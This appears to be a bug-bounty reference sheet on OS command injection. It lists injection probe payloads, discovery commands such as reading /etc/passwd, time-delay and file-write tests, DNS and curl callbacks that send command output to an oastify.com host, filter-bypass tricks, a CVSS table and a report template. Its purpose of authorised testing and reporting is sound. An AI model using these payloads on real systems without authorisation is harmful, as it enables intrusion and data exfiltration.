# Payloads, Severity, and Report Template

## Command separators

```
Both Linux & Windows: &  &&  |  ||
Linux/Unix only:      ;  (newline)  `command`  $(command)
```

## Basic probe payloads

```
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami
127.0.0.1 & whoami &
```

## Non-destructive discovery commands

```
Linux:   whoami   id   uname -a   hostname   ifconfig / ip addr   netstat -an   ps -ef
Windows: whoami   ver   hostname   ipconfig /all              netstat -an   tasklist
File read (Linux):   cat /etc/passwd
File read (Windows): type C:\Windows\win.ini
```

## Blind: time-delay payloads

```
Linux:   ping -c 10 127.0.0.1     sleep 10
Windows: ping 127.0.0.1 -n 10     timeout 10
```

## Blind: file-write validation

```
whoami > /var/www/html/whoami.txt
whoami > C:\inetpub\wwwroot\whoami.txt
```

## OAST / DNS callback payloads

```
& nslookup attacker-oast-subdomain.oastify.com &
& nslookup `whoami`.attacker-oast-subdomain.oastify.com &
& nslookup $(whoami).attacker-oast-subdomain.oastify.com &
```

## OAST: HTTP-based exfiltration

```
& curl http://attacker-oast-subdomain.oastify.com/$(whoami) &
```

## Filter-bypass quick reference

```
Space:      ${IFS}   $IFS$9   <>   {cmd,arg1,arg2}
Keyword:    w'h'o'a'm'i   (quote insertion)
Character:  ${PATH:0:1}   (extract '/' from an existing env var)
Encoding:   %3B (;)   %26 (&)   %7C (|)
```

## Tools

| Tool | Use |
|---|---|
| Burp Collaborator / `interactsh-client` | OAST callback infrastructure for blind/async detection and exfiltration |
| `commix` | Automated command-injection detection and exploitation, with built-in filter-bypass "tamper" scripts (e.g. `space2ifs`) |

---

## CVSS 3.1 quick reference for common command injection findings

| Finding | Typical CVSS range | Severity |
|---|---|---|
| Unauthenticated command injection, confirmed execution | ~9.1–9.8 | Critical |
| Authenticated (any valid account) command injection, confirmed execution | ~8.1–9.1 | High–Critical |
| Blind command injection confirmed only via OAST (no direct output) | ~8.1–9.1 | High–Critical — impact is the same as visible RCE; the blindness affects exploitation difficulty, not severity |
| Argument/flag injection into a wrapped tool, confirmed file read/write | ~7.5–8.8 | High |
| Command injection requiring high-privilege/admin-only access to reach | ~6.5–7.5 | Medium–High |
| Filter/WAF bypass demonstrated with no execution proof behind it | n/a | Not yet a finding — see validation gate in `SKILL.md` |
| Time-delay signal with no control comparison, not reproduced | n/a | Not yet a finding |

## Full report template

```markdown
**Title**: OS command injection in [exact endpoint] allows [actor] to execute arbitrary commands as [context]

## Summary
2-3 plain sentences: the endpoint, the injection mechanism, and how
execution was confirmed (direct output / time delay / OAST callback).

## Steps to Reproduce
1. Send: [exact request — method, path, headers, body]
2. Observe: [exact response, delay measurement, or OAST interaction
   log entry demonstrating execution]
3. [If blind/OAST] Include the Collaborator/interactsh interaction
   log showing the callback and any exfiltrated output it contained

## Proof of Concept
Request/response pair, and/or OAST interaction log screenshot. For
timing-based proof, include multiple trials of both the delay and a
no-delay control request.

## Impact
An attacker can execute arbitrary commands as [the identified user/
context], which includes [state what you actually confirmed — e.g.,
"reading arbitrary files readable by that user" or "reaching internal
host X on the network," based on what whoami/network discovery
actually showed] — described rather than further exploited.

## Suggested Fix
One or two sentences specific to this endpoint — e.g., "Replace the
shell-based call to `ping` with a language-native ICMP library, or at
minimum pass arguments via an array-based process-spawning API
(avoiding shell=True/string concatenation) and validate the input
against a strict allowlist (e.g., a valid IPv4/IPv6 address format)."

## Severity Assessment
CVSS 3.1: X.X ([Severity label]) — see table above for basis
```

### Tone notes

- Lead with the impact and how execution was proven, not a command-injection tutorial.
- For blind/OAST findings, explicitly state that the lack of visible output doesn't reduce severity — make this clear since some triagers under-score blind findings by default.
- State plainly what user/context the commands ran as, and what that context could reach (without having actually gone further than describing it).
- Confirm you stayed non-destructive and say so — it preempts "did you cause any damage?" follow-up questions and signals professionalism.
- Keep it under ~600 words, consistent with the other skills in this set.
